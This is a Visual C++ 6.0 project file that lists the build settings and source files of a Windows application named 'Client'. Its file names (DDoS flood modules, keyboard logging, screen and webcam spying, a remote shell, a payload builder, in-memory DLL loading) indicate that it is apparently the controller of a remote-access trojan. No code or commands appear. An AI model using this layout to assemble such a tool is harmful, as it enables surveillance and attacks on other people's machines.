# Microsoft Developer Studio Project File - Name="Client" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=Client - WIN32 RELEASE
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "Client.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "Client.mak" CFG="Client - WIN32 RELEASE"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "Client - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe
# PROP BASE Use_MFC 6
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 5
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MD /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_AFXDLL" /Yu"stdafx.h" /FD /c
# ADD CPP /nologo /MT /w /W0 /GX /I "../common" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /Fr /YX"stdafx.h" /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "NDEBUG" /d "_AFXDLL"
# ADD RSC /l 0x804 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 /nologo /subsystem:windows /machine:I386
# ADD LINK32 ../common/zlib/zlib.lib ../common/libxvidcore.lib SHLWAPI.LIB nafxcw.lib /nologo /subsystem:windows /machine:I386 /nodefaultlib:"msvcrt.lib" /out:"../Bin/Client.exe"
# SUBTRACT LINK32 /pdb:none /map
# Begin Target

# Name "Client - Win32 Release"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=..\common\Audio.cpp
# End Source File
# Begin Source File

SOURCE=.\AudioDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\BmpToAvi.cpp
# End Source File
# Begin Source File

SOURCE=.\include\Buffer.cpp
# End Source File
# Begin Source File

SOURCE=.\Build.cpp
# End Source File
# Begin Source File

SOURCE=.\ChangeGroup.cpp
# End Source File
# Begin Source File

SOURCE=.\Client.cpp
# End Source File
# Begin Source File

SOURCE=.\Client.rc
# End Source File
# Begin Source File

SOURCE=.\ClientDoc.cpp
# End Source File
# Begin Source File

SOURCE=.\ClientView.cpp
# End Source File
# Begin Source File

SOURCE=.\include\CpuUsage.cpp
# End Source File
# Begin Source File

SOURCE=.\DDOSDrDos.cpp
# End Source File
# Begin Source File

SOURCE=.\DDOSFlood.cpp
# End Source File
# Begin Source File

SOURCE=.\DDOSFlood1.cpp
# End Source File
# Begin Source File

SOURCE=.\DDOSWeb.cpp
# End Source File
# Begin Source File

SOURCE=.\DDOSWeb1.cpp
# End Source File
# Begin Source File

SOURCE=.\DllDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\FileManagerDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\FileTransferModeDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\IniFile.cpp
# End Source File
# Begin Source File

SOURCE=.\InputDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\include\IOCPServer.cpp
# End Source File
# Begin Source File

SOURCE=.\KeyBoardDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\LogView.cpp
# End Source File
# Begin Source File

SOURCE=.\MainFrm.cpp
# End Source File
# Begin Source File

SOURCE=.\MemoryModule.c
# End Source File
# Begin Source File

SOURCE=.\PcView.cpp
# End Source File
# Begin Source File

SOURCE=.\RegDataDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\RegDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\ScreenSpyDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Setting.cpp
# End Source File
# Begin Source File

SOURCE=.\SEU_QQwry.cpp
# End Source File
# Begin Source File

SOURCE=.\ShellDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\StdAfx.cpp
# ADD CPP /Yc"stdafx.h"
# End Source File
# Begin Source File

SOURCE=.\SysInfo.cpp
# End Source File
# Begin Source File

SOURCE=.\SystemDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\TrueColorToolBar.cpp
# End Source File
# Begin Source File

SOURCE=.\UpdateDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\WebCamDlg.cpp
# End Source File
# Begin Source File

SOURCE=..\common\XvidDec.cpp
# End Source File
# Begin Source File

SOURCE=.\ZXPortMap.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=.\AudioDlg.h
# End Source File
# Begin Source File

SOURCE=.\BmpToAvi.h
# End Source File
# Begin Source File

SOURCE=.\include\Buffer.h
# End Source File
# Begin Source File

SOURCE=.\Build.h
# End Source File
# Begin Source File

SOURCE=.\ChangeGroup.h
# End Source File
# Begin Source File

SOURCE=.\Client.h
# End Source File
# Begin Source File

SOURCE=.\ClientDoc.h
# End Source File
# Begin Source File

SOURCE=.\ClientView.h
# End Source File
# Begin Source File

SOURCE=.\DDOSDrDos.h
# End Source File
# Begin Source File

SOURCE=.\DDOSFlood.h
# End Source File
# Begin Source File

SOURCE=.\DDOSFlood1.h
# End Source File
# Begin Source File

SOURCE=.\DDOSWeb.h
# End Source File
# Begin Source File

SOURCE=.\DDOSWeb1.h
# End Source File
# Begin Source File

SOURCE=.\DllDlg.h
# End Source File
# Begin Source File

SOURCE=.\encode.h
# End Source File
# Begin Source File

SOURCE=.\FileManagerDlg.h
# End Source File
# Begin Source File

SOURCE=.\FileTransferModeDlg.h
# End Source File
# Begin Source File

SOURCE=.\IniFile.h
# End Source File
# Begin Source File

SOURCE=.\include\IOCPServer.h
# End Source File
# Begin Source File

SOURCE=.\KeyBoardDlg.h
# End Source File
# Begin Source File

SOURCE=.\LogView.h
# End Source File
# Begin Source File

SOURCE=.\MainFrm.h
# End Source File
# Begin Source File

SOURCE=.\PcView.h
# End Source File
# Begin Source File

SOURCE=.\RegDataDlg.h
# End Source File
# Begin Source File

SOURCE=.\RegDlg.h
# End Source File
# Begin Source File

SOURCE=.\Resource.h
# End Source File
# Begin Source File

SOURCE=.\ScreenSpyDlg.h
# End Source File
# Begin Source File

SOURCE=.\Setting.h
# End Source File
# Begin Source File

SOURCE=.\SEU_QQwry.h
# End Source File
# Begin Source File

SOURCE=.\ShellDlg.h
# End Source File
# Begin Source File

SOURCE=.\StdAfx.h
# End Source File
# Begin Source File

SOURCE=.\SysInfo.h
# End Source File
# Begin Source File

SOURCE=.\SystemDlg.h
# End Source File
# Begin Source File

SOURCE=.\TrueColorToolBar.h
# End Source File
# Begin Source File

SOURCE=.\UpdateDlg.h
# End Source File
# Begin Source File

SOURCE=.\WebCamDlg.h
# End Source File
# Begin Source File

SOURCE=.\ZXPortMap.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# Begin Source File

SOURCE=".\res\icos\1-IP.ico"
# End Source File
# Begin Source File

SOURCE=.\res\1.cur
# End Source File
# Begin Source File

SOURCE=".\res\icos\10-Double.ico"
# End Source File
# Begin Source File

SOURCE=".\res\icos\2-os.ico"
# End Source File
# Begin Source File

SOURCE=.\res\2.cur
# End Source File
# Begin Source File

SOURCE=.\res\2.ico
# End Source File
# Begin Source File

SOURCE=".\res\icos\3-CPU.ico"
# End Source File
# Begin Source File

SOURCE=.\res\3.cur
# End Source File
# Begin Source File

SOURCE=".\res\icos\4-Memory.ico"
# End Source File
# Begin Source File

SOURCE=.\res\4.cur
# End Source File
# Begin Source File

SOURCE=".\res\icos\5-disk.ico"
# End Source File
# Begin Source File

SOURCE=".\res\icos\6-UserName.ico"
# End Source File
# Begin Source File

SOURCE=".\res\icos\7-Active.ico"
# End Source File
# Begin Source File

SOURCE=".\res\icos\8-Anti.ico"
# End Source File
# Begin Source File

SOURCE=.\res\aa.ico
# End Source File
# Begin Source File

SOURCE=.\res\AppWindows.ico
# End Source File
# Begin Source File

SOURCE=.\res\audio.ico
# End Source File
# Begin Source File

SOURCE=.\res\bar.bmp
# End Source File
# Begin Source File

SOURCE=.\res\barnew.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Bitmap_4.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Bitmap_5.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Client.ico
# End Source File
# Begin Source File

SOURCE=.\res\Client.rc2
# End Source File
# Begin Source File

SOURCE=.\res\cmdshell.ico
# End Source File
# Begin Source File

SOURCE=.\res\DDOS.ico
# End Source File
# Begin Source File

SOURCE=.\res\dialupass.ico
# End Source File
# Begin Source File

SOURCE=.\res\dot.cur
# End Source File
# Begin Source File

SOURCE=.\res\dword.ico
# End Source File
# Begin Source File

SOURCE=.\res\event.ico
# End Source File
# Begin Source File

SOURCE=.\res\EventError.ico
# End Source File
# Begin Source File

SOURCE=.\res\explorer.ico
# End Source File
# Begin Source File

SOURCE=.\res\File.ico
# End Source File
# Begin Source File

SOURCE=.\res\ico.ico
# End Source File
# Begin Source File

SOURCE=.\res\keyboard.ico
# End Source File
# Begin Source File

SOURCE=.\res\Monolith.ico
# End Source File
# Begin Source File

SOURCE=.\res\Process.ico
# End Source File
# Begin Source File

SOURCE=.\res\regedit.ico
# End Source File
# Begin Source File

SOURCE=.\res\regsz.ico
# End Source File
# Begin Source File

SOURCE=.\res\remote.ico
# End Source File
# Begin Source File

SOURCE=.\res\shipin.ico
# End Source File
# Begin Source File

SOURCE=.\res\system.ico
# End Source File
# Begin Source File

SOURCE=.\res\toolbar1.bmp
# End Source File
# Begin Source File

SOURCE=.\res\toolbar2.bmp
# End Source File
# Begin Source File

SOURCE=.\res\toolbar4.bmp
# End Source File
# Begin Source File

SOURCE=.\res\user.ico
# End Source File
# Begin Source File

SOURCE=.\res\Warning.ico
# End Source File
# Begin Source File

SOURCE=.\res\webcam.ico
# End Source File
# Begin Source File

SOURCE=.\res\XTPBAR1.bmp
# End Source File
# Begin Source File

SOURCE=.\res\XTPBAR2.bmp
# End Source File
# Begin Source File

SOURCE=".\res\ÎÄ¼þ¼Ð1.ico"
# End Source File
# End Group
# Begin Source File

SOURCE=.\ReadMe.txt
# End Source File
# Begin Source File

SOURCE=.\res\xp.xml
# End Source File
# End Target
# End Project
